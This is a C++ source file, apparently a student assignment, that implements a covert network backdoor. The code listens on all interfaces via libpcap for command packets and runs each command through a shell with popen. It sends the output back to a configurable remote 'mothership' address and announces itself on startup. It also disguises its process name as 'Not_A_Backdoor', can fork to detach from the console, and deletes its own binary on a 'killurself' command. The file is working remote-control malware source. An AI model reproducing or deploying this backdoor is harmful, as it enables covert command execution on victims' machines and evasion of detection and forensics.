#include <iostream>
#include <cstring>
#include <sys/prctl.h>
#include <signal.h>
#include <csignal>
#include <pcap.h>
#include <zconf.h>
#include "NetworkMonitor.h"
#include "CovertSocket.h"
#include "../utils/Logger.h"
#include "../utils/argparcer.h"


//Backdoor System Wide Defaults
const string DEFAULT_PROCESS_MASK = "Not_A_Backdoor";
const string DEFAULT_SOURCE_ADDRESS = "127.0.0.1";
const string DEFAULT_DESTINATION_ADDRESS = "127.0.0.1";
const string DEFAULT_LISTENING_PORT = "100";

//Interface Structures For Listening
pcap_if_t * allInterfaces = nullptr;
pcap_if_t * listeningInterface = nullptr;

//Processing Structures For Backdoor Communication
bool keepListening = true;
NetworkMonitor * monitor = nullptr;

//Directories For Self Destruction
string * cwd = nullptr;
string * exePath = nullptr;

/**
 * shutdownServer is an event handler for Ctrl+C and shutdown requesting events. This method is called
 * in code and is registered to be triggered whenever Ctrl+C is called on the program. This ensures all
 * components of the backdoor have stopped before full termination occurs
 * @param signo
 */
void shutdownServer(int signo){
    Logger::println("Terminating Program");

    keepListening = false;
    monitor->killListening();

}

/**
 * getInterface is a helper method that finds all interfaces on the host machine. libpcap offers an 'any' interface
 * which allows the backdoor to listen to any traffic that comes into the machine it is running on. getInterface
 * fetches all interfaces and the searches specificaly for that interface.
 * @return Boolean - status as to whether it successfuly found the any interface
 */
bool getInterface(){

    Logger::debug("Main:getInterfaces - Initializing");

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t * interfaces;
    pcap_if_t * interface;

    Logger::debug("Main:getInterfaces - Finding All Interfaces");

    if(pcap_findalldevs(&interfaces, errbuf) == -1){
        Logger::error("Main:getInterfaces - There Was An Error Fetching The Interfaces");
        cerr << errbuf << endl;
        return false;
    }

    Logger::debug("Main:getInterfaces - Looping Through All Interfaces") ;

    allInterfaces = interfaces;
    interface = interfaces;
    while(interface != NULL){
        const char * name = interface->name;

        Logger::debug("Main:getInterfaces - Testing Interface With Name: " + string(name));

        if(strcmp(name, string("any").c_str()) == 0){
            //this is the any interface
            Logger::debug("Main:getInterfaces - FOUND THE ANY INTERFACE");

            listeningInterface = interface;
            return true;
        }

        interface = interface->next;
    }

    return false;
}

/**
 * executeCommand is the main processing function for an incoming command into the backdoor. When a request is received
 * and it is deamed a command for the backdoor, it is passed to this method which launches a shell and passes the command
 * to it. It then reads the response which is then returned. Specialized commands are also integrated into the system
 * including chdir which is used whenever a cd command is passed. Additionaly the self-destruct command 'killurself'
 * will cause the backdoor program to delete and self terminate itself.
 * @param command Strng - the command to be executed on the system
 * @return String - contents from stdout and stderr read from the shell post execution of the command
 */
string executeCommand(string command){

    Logger::debug("Setting Up Variables To Execute Command");

    //append redirects to the command
    command = command + " 2>&1";
    //command = command + "\n";
    string response = ""; // storage for response
    const int BUFFERSIZE = 2048;
    char BUFFER[BUFFERSIZE];
    memset(BUFFER, 0 , sizeof(BUFFER));
    FILE *fp;

    Logger::debug("Command At This Point Is: >" + command + "<");

    //check for suicide command
    if(command.compare("killurself")==0){
        Logger::debug("Self Destruct Command Requested. Going Dark");

        //delete the binary
        if(remove(exePath->c_str()) == 0){
            Logger::debug("Deletion of Binary Successful");
        }else{
            Logger::debug("Deletion of Binary Failed");
        };

        Logger::debug("Now Shutting Down");
        shutdownServer(0);
        return "";
    }

    size_t position = command.find("cd");
    if(position != string::npos){
        chdir(command.substr(position+3).c_str());
        response += "[DIRECTORY CHANGED TO]: ";
        command = "pwd";
    }

    if((fp = popen(command.c_str(), "r")) == NULL){
        Logger::error("Main:executeCommand - There Was An Error Executing The Command");
        response += "[ERROR EXECUTING COMMAND] ";
    }

    Logger::debug("Command Has Been Executed. Response At This Pont Is: >" + response + "<");

    while(fgets(BUFFER, sizeof(BUFFER), fp) != NULL){

        char tmp[BUFFERSIZE];
        strcpy(tmp, BUFFER);

        string responseLine = string(tmp);

        Logger::debug("ResponseLine Is: " + responseLine);

        response += responseLine;

        Logger::debug("Total Response At This Time Is: >" + response + "<");

        //refresh the buffer;
        memset(BUFFER, 0 , sizeof(BUFFER));
    }

    Logger::debug("Done Looping. Total Response At This Time Is: >" + response + "<");
    Logger::debug("Closing popen");

    if(pclose(fp)){
        Logger::error("Main:executeCommand - There Was An Error Executing The Command Or Command Exited With Error Status");
        response += " [ERROR EXECUTING COMMAND OR COMMAND EXITED WITH ERROR STATUS]";
    }

    Logger::debug("popen Close Complete. Response At this Time Is: >" + response + "<");

    return response;

}

/**
 * printUsage is a helper method that prints all of the command options of the backdoor portion of the program
 */
void printUsage(){

    Logger::println("8505-a3-backdoor - By Ben Soer and Sean Hodgkinson");
    Logger::println("Usage: ./8505-a3-backdoor <--LEAVE|--DEBUG> [-s SourceIP(default:127.0.0.1)] [-d DestinationIP(default:127.0.0.1)] [-p ListeningPort(default:100)]");
    Logger::println("Params:");
    Logger::println("\t-s\t\t Set the Source IP Address Of The Backdoor. Packet Responses Will Be Sent With This IP in the Source Address");
    Logger::println("\t-d\t\t Set the Destination IP Address Of The Backdoor. Packet Responses Will Be Send With This IP in the Destination Address");
    Logger::println("\t-p\t\t Set the Listening Port the Backdoor will Listen For Incoming Requests On");
    Logger::println("Flags:");
    Logger::println("\t--LEAVE\t\t Execute the Backdoor on a seperate process from the console. Thus unlocking the console");
    Logger::println("\t--DEBUG\t\t Run in Debug Mode. This Increases the Amount of information printed to console");
    Logger::println("Minimal Setup Example:");
    Logger::println("\t ./8505-a3-backdoor --LEAVE");

}

/**
 * main is the main entrance to the program. Taking in the parameters and initiating the backdoor program
 * @param argc Integer - The number of parameters passed
 * @param argv Array<Char *> - Pointer structure to the arguments
 * @return Integer - Status of successful or error termination
 */
int main(int argc, char * argv[]) {

    //parse out all the arguments
    ArgParcer parcer;

    if(argc <= 1){
        printUsage();
        return 0;
    }

    if(parcer.TagExists("--LEAVE", argv, argc)){

        pid_t pid = fork();
        if(pid < 0){
            cout << "There Was An Error Forking. Aborting" << endl;
            return 1;
        }

        if(pid > 0){
            cout << "This Is The Parent. Terminating" << endl;
            return 0;
        }

    }

    Logger::setDebug(parcer.TagExists("--DEBUG", argv, argc));
    Logger::debug("Starting Program");


    //by default the backdoor will source and destination to 127.0.0.1 and listen on port 100
    string sourceAddress = parcer.GetTagData("-s", argv, argc);
    string destinationAddress = parcer.GetTagData("-d", argv, argc); //Where is the mothership ?
    string listeningPort = parcer.GetTagData("-p", argv, argc); //What port do i listen for commands from ?
    string processMask = parcer.GetTagData("-m", argv, argc); // Get the process name

    if(sourceAddress.compare("-1")==0){
        Logger::debug("Source Address Is Set To Default " + DEFAULT_SOURCE_ADDRESS);
    }else{
        Logger::debug("Source Address Is Set To " + sourceAddress);
    }

    if(destinationAddress.compare("-1")==0){
        Logger::debug("Desintaiton Address Is Set To Default " + DEFAULT_DESTINATION_ADDRESS);
    }else{
        Logger::debug("Destination Address Is Set To " + destinationAddress);
    }

    if(listeningPort.compare("-1")==0){
        Logger::debug("Listening Port Is Set To Default " + DEFAULT_LISTENING_PORT);
    }else{
        Logger::debug("Listening Port Is Set To " + listeningPort);
    }

    //get current directory so we know how to kill ourself
    char BUFFER[1024];
    if(getcwd(BUFFER, sizeof(BUFFER)) == NULL){
        Logger::error("Unable To Find Myself. Self Destruct Not Possible");
    }else{
        Logger::debug("Curretn Directory Found Is: " + string(BUFFER));
        cwd = new string(BUFFER);
        exePath = new string((*cwd) + "/" + string(argv[0]));
        Logger::debug("Absolute Path To Executable Is: " + *exePath);
    }

    //mask the program
    memset(argv[0], 0, strlen(argv[0]));
    if(processMask.compare("-1")==0){
        strcpy(argv[0], DEFAULT_PROCESS_MASK.c_str());
        prctl(PR_SET_NAME, DEFAULT_PROCESS_MASK.c_str(), 0,0);
    }else{
        strcpy(argv[0], processMask.c_str());
        prctl(PR_SET_NAME, processMask.c_str(), 0,0);
    }

    Logger::debug("Masking Complete");

    //register listening for kill commands.
    struct sigaction act;
    act.sa_handler = shutdownServer;
    act.sa_flags = 0;
    if(sigemptyset(&act.sa_mask) == -1 || sigaction(SIGINT, &act, NULL) == -1){
        perror("Failed to Set SIGNINT Handler");
        return 1;
    }

    Logger::debug("Registering Signal");

    //find listening items
    if(getInterface() == false){
        Logger::error("Main - There was An Error Reading The Interfaces");
        return 1;
    }else{
        Logger::debug("Finding Interface Successful");
    }

    Logger::debug("Finding Interfaces");


    //start monitoring for UDP traffic. If it is our own, it needs handling, if not, add it to traffic analyzer
    CovertSocket * socket = CovertSocket::getInstance(); //how we respond to commands
    monitor = NetworkMonitor::getInstance(); //how we listen for commands

    //set the source address
    if(sourceAddress.compare("-1")==0){
        socket->setSourceAddress(DEFAULT_SOURCE_ADDRESS);
    }else{
        socket->setSourceAddress(sourceAddress);
    }

    //set the destination address
    if(destinationAddress.compare("-1")==0){
        socket->setDestinationAddress(DEFAULT_DESTINATION_ADDRESS);
    }else{
        socket->setDestinationAddress(destinationAddress);
    }

    //set the listening port
    if(listeningPort.compare("-1")==0){
        monitor->setListeningPort(DEFAULT_LISTENING_PORT);
    }else{
        monitor->setListeningPort(listeningPort);
    }


    //Were ready - ET PHONE HOME
    socket->send("READY");

    while(keepListening){

        string command = monitor->listenForTraffic(listeningInterface); //this will hang until a single unit of data is received and then return it

        if(strcmp(command.c_str(), "-1")==0){
            shutdownServer(0);
        }

        if(keepListening == false){
            break;
        }

        string response = executeCommand(command);

        if(keepListening == false){
            break;
        }

        socket->send(response);
    }


    Logger::debug("Loop Killed. Terminating");

    Logger::debug("Freeing All ResourceS");
    pcap_freealldevs(allInterfaces);
    allInterfaces = nullptr;
    listeningInterface = nullptr;

    delete(socket);
    delete(monitor);

    socket = nullptr;
    monitor = nullptr;

    return 0;
}